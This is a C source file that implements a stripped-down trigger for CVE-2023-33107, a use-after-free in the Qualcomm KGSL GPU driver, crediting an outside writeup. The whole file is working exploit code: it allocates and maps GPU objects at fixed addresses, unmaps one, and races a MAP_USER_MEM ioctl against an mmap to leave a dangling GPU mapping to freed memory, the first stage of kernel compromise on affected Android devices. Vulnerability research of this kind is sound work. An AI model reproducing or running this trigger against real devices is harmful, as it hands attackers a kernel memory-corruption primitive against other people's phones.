//==================================================================================================
// Keto's CVE-2023-33107 uaf trigger, boiled down to the bare minimum. 
//==================================================================================================
// Check out his awesome 2023-33107 writeup at https://keto0422.github.io/2026/02/11/cve-writeup/ 
//==================================================================================================
#include "picohaxx.h"
#include "2023-33107.h"

struct uaf_state g_uaf;
int kgsl = -1;

void *bogus_racer(void *arg) {
    race_state_t *rs = (race_state_t *)arg;
    while (!rs->ready) __asm__ __volatile__("" ::: "memory");

    rs->bogus_started = 1;
    __sync_synchronize();

    struct kgsl_map_user_mem req = {0};
    req.fd = -1; req.gpuaddr = 0;
    req.len = WRAP_SIZE; req.offset = 0;
    req.hostptr = BOGUS_START; req.memtype = KGSL_USER_MEM_TYPE_ADDR;
    req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

    rs->result = ioctl(rs->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    rs->saved_errno = errno;
    __sync_synchronize();
    return NULL;
}

void cleanup_uaf() {
    if (g_uaf.overlap_vma && g_uaf.overlap_vma != MAP_FAILED) munmap(g_uaf.overlap_vma, g_uaf.overlap_mmapsize);
    if (g_uaf.ph_vma && g_uaf.ph_vma != MAP_FAILED) munmap(g_uaf.ph_vma, g_uaf.ph_mmapsize);
    if (g_uaf.bogus_vma && g_uaf.bogus_vma != MAP_FAILED) munmap(g_uaf.bogus_vma, PAGE_SIZE * 3);

    struct kgsl_gpuobj_free free_obj = {0};
    if (g_uaf.overlap_id) { free_obj.id = g_uaf.overlap_id; ioctl(kgsl, IOCTL_KGSL_GPUOBJ_FREE, &free_obj); }
    if (g_uaf.ph_id)      { free_obj.id = g_uaf.ph_id;      ioctl(kgsl, IOCTL_KGSL_GPUOBJ_FREE, &free_obj); }
    if (g_uaf.uaf_id)     { free_obj.id = g_uaf.uaf_id;     ioctl(kgsl, IOCTL_KGSL_GPUOBJ_FREE, &free_obj); }

    if (kgsl >= 0) { close(kgsl); kgsl = -1; }
    memset(&g_uaf, 0, sizeof(g_uaf));
}

int generate_uaf_range()
{
    memset(&g_uaf, 0, sizeof(g_uaf));
    void *uaf_vma = NULL;

    kgsl = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (kgsl < 0) { perror("open /dev/kgsl-3d0"); return -1; }

    log2("[1] UAF GPUOBJ_ALLOC");
    struct kgsl_gpuobj_alloc uaf_alloc = { .size = UAF_SIZE, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(kgsl, IOCTL_KGSL_GPUOBJ_ALLOC, &uaf_alloc) < 0) return -1;
    g_uaf.uaf_id = uaf_alloc.id;
    g_uaf.uaf_mmapsize = uaf_alloc.mmapsize;

    log2("[2] OVERLAP GPUOBJ_ALLOC");
    struct kgsl_gpuobj_alloc overlap_alloc = { .size = OVERLAP_SIZE, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(kgsl, IOCTL_KGSL_GPUOBJ_ALLOC, &overlap_alloc) < 0) return -1;
    g_uaf.overlap_id = overlap_alloc.id;
    g_uaf.overlap_mmapsize = overlap_alloc.mmapsize;

    log2("[3] UAF mmap() at FIXED 0x%llx", UAF_START);
    uaf_vma = mmap_gpuobj_fixed(kgsl, g_uaf.uaf_id, g_uaf.uaf_mmapsize, (void *)(uintptr_t)UAF_START);
    if (uaf_vma == MAP_FAILED || (uint64_t)uaf_vma != UAF_START) return -1;
    for (size_t i = 0; i < g_uaf.uaf_mmapsize; i += PAGE_SIZE) ((volatile char *)uaf_vma)[i] = 1;

    log2("[4] UAF munmap()");
    munmap(uaf_vma, g_uaf.uaf_mmapsize);
    usleep(200);

    log2("[5] Anonymous mmap at 0x%llx", BOGUS_START);
    g_uaf.bogus_vma = mmap((void *)(uintptr_t)BOGUS_START, PAGE_SIZE * 3, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (g_uaf.bogus_vma == MAP_FAILED || (uint64_t)g_uaf.bogus_vma != BOGUS_START) return -1;
    for (int i = 0; i < 3; i++) ((volatile char *)g_uaf.bogus_vma)[i * PAGE_SIZE] = 1;

    log2("[6] PLACEHOLDER GPUOBJ_ALLOC");
    struct kgsl_gpuobj_alloc ph_alloc = { .size = PLACEH_SIZE, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(kgsl, IOCTL_KGSL_GPUOBJ_ALLOC, &ph_alloc) < 0) return -1;
    g_uaf.ph_id = ph_alloc.id;
    g_uaf.ph_mmapsize = ph_alloc.mmapsize;

    log2("[7] PLACEHOLDER mmap() at FIXED 0x%llx", PLACEH_START);
    g_uaf.ph_vma = mmap_gpuobj_fixed(kgsl, g_uaf.ph_id, g_uaf.ph_mmapsize, (void *)(uintptr_t)PLACEH_START);
    if (g_uaf.ph_vma == MAP_FAILED || (uint64_t)g_uaf.ph_vma != PLACEH_START) return -1;
    for (size_t i = 0; i < g_uaf.ph_mmapsize; i += (PAGE_SIZE * 1024)) ((volatile char *)g_uaf.ph_vma)[i] = 1;

    log2("[8] Main thread will mmap OVERLAP");
    race_state_t rs = { .fd = kgsl, .ready = 0, .
    bogus_started = 0, .result = -1, .saved_errno = 0 };
    pthread_t bogus_thread;
    pthread_create(&bogus_thread, NULL, bogus_racer, &rs);

    rs.ready = 1;
    __sync_synchronize();

    int timeout = 0;
    while (!rs.bogus_started && timeout < 1000) { __asm__ __volatile__("" ::: "memory"); timeout++; }
    usleep(200);

    log2("[9] OVERLAP mmap() at FIXED 0x%llx during race", OVERLAP_START);
    g_uaf.overlap_vma = mmap_gpuobj_fixed(kgsl, g_uaf.overlap_id, g_uaf.overlap_mmapsize, (void *)(uintptr_t)OVERLAP_START);
    int mmap_errno = errno;
    pthread_join(bogus_thread, NULL);

    if (g_uaf.overlap_vma == MAP_FAILED && mmap_errno == 19) { // ENODEV
        log2(green("[!] RACE CONDITION WON!"));
        struct kgsl_gpuobj_free uaf_free = { .id = g_uaf.uaf_id };
        if (ioctl(kgsl, IOCTL_KGSL_GPUOBJ_FREE, &uaf_free) == 0) g_uaf.uaf_id = 0; // successfully freed
        //===============================================================
        // we now have a dangling mapping via gpu to the 256mb region
        //===============================================================
        return 0;
    }

    log2(red("[-] Race failed (errno=%d)"), mmap_errno);
    return -1;
}
